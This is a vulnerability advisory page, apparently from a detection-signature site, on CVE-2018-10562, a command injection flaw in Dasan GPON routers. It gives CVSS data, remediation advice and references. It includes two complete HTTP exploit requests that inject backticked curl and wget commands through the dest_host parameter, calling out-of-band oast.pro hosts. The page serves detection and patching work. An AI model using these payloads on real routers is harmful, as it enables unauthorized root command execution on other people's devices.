---
layout: post
cve_id: CVE-2018-10562
title: Dasan GPON Devices - Remote Code Execution
pcap: true
pcap_path: /pcaps/2018/CVE-2018-10562.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2018/CVE-2018-10562.yaml
snort2_rule: N/A
snort3_rule: N/A
author: gy741
severity: critical
impact: 'Successful exploitation of this vulnerability allows an attacker to execute
  arbitrary commands with root privileges on the affected device.

  '
remediation: 'Apply the latest firmware update provided by the vendor to mitigate
  this vulnerability.

  '
reference:
- https://www.vpnmentor.com/blog/critical-vulnerability-gpon-router
- https://github.com/f3d0x0/GPON/blob/master/gpon_rce.py
- https://nvd.nist.gov/vuln/detail/CVE-2018-10562
- https://www.vpnmentor.com/blog/critical-vulnerability-gpon-router/
- https://github.com/ethicalhackeragnidhra/GPON
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2018-10562
  cwe-id: CWE-78
  epss-score: 0.94028
  epss-percentile: 0.9989
  cpe: cpe:2.3:o:dasannetworks:gpon_router_firmware:-:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: dasannetworks
  product: gpon_router_firmware
tags:
- cve
- cve2018
- dasan
- gpon
- rce
- oast
- kev
- dasannetworks
- vkev
- vuln
---

## üîç Vulnerability Description
Dasan GPON home routers are susceptible to command injection which can occur via the dest_host parameter in a diag_action=ping request to a GponForm/diag_Form URI. Because the router saves ping results in /tmp and transmits them to the user when the user revisits /diag.html, it's quite simple to execute commands and retrieve their output.

## üåê HTTP Request
```nohighlight
POST /GponForm/diag_Form?images/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_3; en-ca) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.1 Safari/525.20
Connection: close
Content-Length: 220
Accept-Encoding: gzip
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+curl+http%3a//d5jpnlple0o4n7388dogb91ztnpj4bnr8.oast.pro+-H+'User-Agent%3a+gYPic7'`;busybox wget http://d5jpnlple0o4n7388dog9dyyq7rajcfqo.oast.pro&ipv=0
```

```nohighlight
POST /GponForm/diag_Form?images/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Connection: close
Content-Length: 204
Accept-Encoding: gzip
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`curl+http%3a//d5jpnlple0o4n7388dogowi7o85k4fbnh.oast.pro+-H+'User-Agent%3a+gYPic7'`;wget http://d5jpnlple0o4n7388dog71oxpwnyfcqnw.oast.pro&ipv=0
```

